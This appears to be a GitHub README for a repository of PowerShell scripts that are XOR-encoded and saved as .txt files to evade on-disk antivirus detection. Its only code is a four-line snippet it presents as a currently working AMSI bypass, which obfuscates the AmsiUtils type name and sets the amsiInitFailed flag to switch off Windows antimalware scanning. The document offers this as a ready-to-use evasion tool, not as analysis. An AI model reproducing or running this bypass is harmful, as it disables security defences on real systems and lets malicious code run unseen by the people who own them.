# PS-Scripts-Obfuscated
Powewrshell scripts xor encoded and convereted to .txt to avoid on disk detction. 


## The below is currently a working AMSI bypass.   
```
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```
